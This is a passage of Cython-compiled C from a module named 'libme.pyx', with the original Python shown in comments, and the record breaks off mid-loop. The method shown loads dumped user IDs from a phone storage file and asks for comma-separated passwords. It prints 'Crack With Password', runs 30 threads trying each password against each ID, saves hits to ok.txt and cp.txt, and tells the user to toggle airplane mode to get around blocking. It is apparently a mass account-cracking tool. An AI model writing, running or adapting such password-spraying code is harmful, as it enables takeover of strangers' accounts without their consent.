static PyObject *__pyx_pw_5libme_5James_47__Frrr__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Frrr__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_46__Frrr__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_46__Frrr__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_myfile = NULL;
  PyObject *__pyx_v_line = NULL;
  PyObject *__pyx_v_ask = NULL;
  PyObject *__pyx_v_coeg = NULL;
  PyObject *__pyx_v_listpass = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_uid = NULL;
  PyObject *__pyx_v_name = NULL;
  PyObject *__pyx_v_ft = NULL;
  PyObject *__pyx_v_pwx = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  Py_ssize_t __pyx_t_7;
  PyObject *(*__pyx_t_8)(PyObject *);
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  int __pyx_t_12;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  PyObject *(*__pyx_t_15)(PyObject *);
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  Py_ssize_t __pyx_t_20;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__Frrr__", 0);

  /* "libme.pyx":728
 * 		print("  [] Extra File saved in > %s"%(_____))
 * 	def __Frrr__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			myfile = '/storage/emulated/0/f_2.txt'
 * 			for line in open(myfile, 'r').readlines():
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "libme.pyx":729
 * 	def __Frrr__(self):
 * 		try:
 * 			myfile = '/storage/emulated/0/f_2.txt'             # <<<<<<<<<<<<<<
 * 			for line in open(myfile, 'r').readlines():
 * 				self.id.append(line.strip())
 */
      __Pyx_INCREF(__pyx_kp_s_storage_emulated_0_f_2_txt);
      __pyx_v_myfile = __pyx_kp_s_storage_emulated_0_f_2_txt;

      /* "libme.pyx":730
 * 		try:
 * 			myfile = '/storage/emulated/0/f_2.txt'
 * 			for line in open(myfile, 'r').readlines():             # <<<<<<<<<<<<<<
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 */
      __pyx_t_5 = PyTuple_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 730, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_INCREF(__pyx_v_myfile);
      __Pyx_GIVEREF(__pyx_v_myfile);
      PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_v_myfile);
      __Pyx_INCREF(__pyx_n_s_r);
      __Pyx_GIVEREF(__pyx_n_s_r);
      PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_n_s_r);
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_5, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 730, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_readlines); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 730, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 730, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
        __pyx_t_5 = __pyx_t_4; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
        __pyx_t_8 = NULL;
      } else {
        __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 730, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 730, __pyx_L3_error)
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      for (;;) {
        if (likely(!__pyx_t_8)) {
          if (likely(PyList_CheckExact(__pyx_t_5))) {
            if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 730, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 730, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          } else {
            if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 730, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 730, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          }
        } else {
          __pyx_t_4 = __pyx_t_8(__pyx_t_5);
          if (unlikely(!__pyx_t_4)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 730, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_4);
        }
        __Pyx_XDECREF_SET(__pyx_v_line, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":731
 * 			myfile = '/storage/emulated/0/f_2.txt'
 * 			for line in open(myfile, 'r').readlines():
 * 				self.id.append(line.strip())             # <<<<<<<<<<<<<<
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Please Dump File first %s not found"%(myfile))
 */
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 731, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_line, __pyx_n_s_strip); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 731, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
          }
        }
        __pyx_t_6 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 731, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_11 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_t_6); if (unlikely(__pyx_t_11 == ((int)-1))) __PYX_ERR(0, 731, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

        /* "libme.pyx":730
 * 		try:
 * 			myfile = '/storage/emulated/0/f_2.txt'
 * 			for line in open(myfile, 'r').readlines():             # <<<<<<<<<<<<<<
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 */
      }
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      /* "libme.pyx":728
 * 		print("  [] Extra File saved in > %s"%(_____))
 * 	def __Frrr__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			myfile = '/storage/emulated/0/f_2.txt'
 * 			for line in open(myfile, 'r').readlines():
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":732
 * 			for line in open(myfile, 'r').readlines():
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):             # <<<<<<<<<<<<<<
 * 			exit("\n [!] Please Dump File first %s not found"%(myfile))
 * 		ask = input("  [!] Password Method [y/t] : ")
 */
    __pyx_t_12 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
    if (__pyx_t_12) {
      __Pyx_AddTraceback("libme.James.__Frrr__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_4) < 0) __PYX_ERR(0, 732, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_4);

      /* "libme.pyx":733
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Please Dump File first %s not found"%(myfile))             # <<<<<<<<<<<<<<
 * 		ask = input("  [!] Password Method [y/t] : ")
 * 		if ask == "y":
 */
      if (unlikely(!__pyx_v_myfile)) { __Pyx_RaiseUnboundLocalError("myfile"); __PYX_ERR(0, 733, __pyx_L5_except_error) }
      __pyx_t_9 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Please_Dump_File_first_s_not_fo, __pyx_v_myfile); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 733, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 733, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":728
 * 		print("  [] Extra File saved in > %s"%(_____))
 * 	def __Frrr__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			myfile = '/storage/emulated/0/f_2.txt'
 * 			for line in open(myfile, 'r').readlines():
 */
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":734
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Please Dump File first %s not found"%(myfile))
 * 		ask = input("  [!] Password Method [y/t] : ")             # <<<<<<<<<<<<<<
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
  __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__51, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 734, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_v_ask = __pyx_t_4;
  __pyx_t_4 = 0;

  /* "libme.pyx":735
 * 			exit("\n [!] Please Dump File first %s not found"%(myfile))
 * 		ask = input("  [!] Password Method [y/t] : ")
 * 		if ask == "y":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 */
  __pyx_t_13 = (__Pyx_PyString_Equals(__pyx_v_ask, __pyx_n_s_y, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 735, __pyx_L1_error)
  if (__pyx_t_13) {

    /* "libme.pyx":736
 * 		ask = input("  [!] Password Method [y/t] : ")
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 */
    /*with:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 736, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 736, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 736, __pyx_L1_error)
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_empty_tuple, __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 736, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 736, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_4 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 736, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_6 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 736, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __pyx_t_6;
      __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      /*try:*/ {
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_2, &__pyx_t_1, &__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_2);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_14);
          /*try:*/ {
            __pyx_v_coeg = __pyx_t_4;
            __pyx_t_4 = 0;

            /* "libme.pyx":737
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")             # <<<<<<<<<<<<<<
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_For_example_separators_44) < 0) __PYX_ERR(0, 737, __pyx_L18_error)

            /* "libme.pyx":738
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")             # <<<<<<<<<<<<<<
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")
 */
            __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__10, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 738, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_v_listpass = __pyx_t_4;
            __pyx_t_4 = 0;

            /* "libme.pyx":739
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack With Password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
            __pyx_t_7 = PyObject_Length(__pyx_v_listpass); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 739, __pyx_L18_error)
            __pyx_t_13 = ((__pyx_t_7 <= 5) != 0);
            if (__pyx_t_13) {

              /* "libme.pyx":740
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")             # <<<<<<<<<<<<<<
 * 				print("  \033[0;97m[] Crack With Password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
              __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__11, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 740, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

              /* "libme.pyx":739
 * 				print("\n  \033[0;97m[*] For example separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack With Password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
            }

            /* "libme.pyx":741
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack With Password > (\033[0;91m%s\033[0;97m)"%(listpass))             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 */
            __pyx_t_4 = __Pyx_PyString_FormatSafe(__pyx_kp_s_0_97m_Crack_With_Password_0_91m, __pyx_v_listpass); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 741, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_4);
            if (__Pyx_PrintOne(0, __pyx_t_4) < 0) __PYX_ERR(0, 741, __pyx_L18_error)
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            /* "libme.pyx":742
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack With Password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 742, __pyx_L18_error)

            /* "libme.pyx":743
 * 				print("  \033[0;97m[] Crack With Password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 743, __pyx_L18_error)

            /* "libme.pyx":744
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")             # <<<<<<<<<<<<<<
 * 				for user in self.id:
 * 					uid, name = user.split("|")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_If_No_Result_Turn_On_Airplane_M) < 0) __PYX_ERR(0, 744, __pyx_L18_error)

            /* "libme.pyx":745
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 */
            __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 745, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_4);
            if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
              __pyx_t_5 = __pyx_t_4; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
              __pyx_t_8 = NULL;
            } else {
              __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 745, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 745, __pyx_L18_error)
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            for (;;) {
              if (likely(!__pyx_t_8)) {
                if (likely(PyList_CheckExact(__pyx_t_5))) {
                  if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_4 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 745, __pyx_L18_error)
                  #else
                  __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 745, __pyx_L18_error)
                  __Pyx_GOTREF(__pyx_t_4);
                  #endif
                } else {
                  if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 745, __pyx_L18_error)
                  #else
                  __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 745, __pyx_L18_error)
                  __Pyx_GOTREF(__pyx_t_4);
                  #endif
                }
              } else {
                __pyx_t_4 = __pyx_t_8(__pyx_t_5);
                if (unlikely(!__pyx_t_4)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 745, __pyx_L18_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_4);
              }
              __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_4);
              __pyx_t_4 = 0;

              /* "libme.pyx":746
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:
 * 					uid, name = user.split("|")             # <<<<<<<<<<<<<<
 * 					coeg.submit(self.__file__,uid, listpass.split(","))
 * 		elif ask == "t":
 */
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 746, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_10 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_6);
                if (likely(__pyx_t_10)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                  __Pyx_INCREF(__pyx_t_10);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_6, function);
                }
              }
              __pyx_t_4 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_10, __pyx_kp_s__38) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_s__38);
              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
              if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 746, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              if ((likely(PyTuple_CheckExact(__pyx_t_4))) || (PyList_CheckExact(__pyx_t_4))) {
                PyObject* sequence = __pyx_t_4;
                Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                if (unlikely(size != 2)) {
                  if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                  else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                  __PYX_ERR(0, 746, __pyx_L18_error)
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                if (likely(PyTuple_CheckExact(sequence))) {
                  __pyx_t_6 = PyTuple_GET_ITEM(sequence, 0); 
                  __pyx_t_10 = PyTuple_GET_ITEM(sequence, 1); 
                } else {
                  __pyx_t_6 = PyList_GET_ITEM(sequence, 0); 
                  __pyx_t_10 = PyList_GET_ITEM(sequence, 1); 
                }
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_10);
                #else
                __pyx_t_6 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 746, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_10 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 746, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_10);
                #endif
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              } else {
                Py_ssize_t index = -1;
                __pyx_t_9 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 746, __pyx_L18_error)
                __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __pyx_t_15 = Py_TYPE(__pyx_t_9)->tp_iternext;
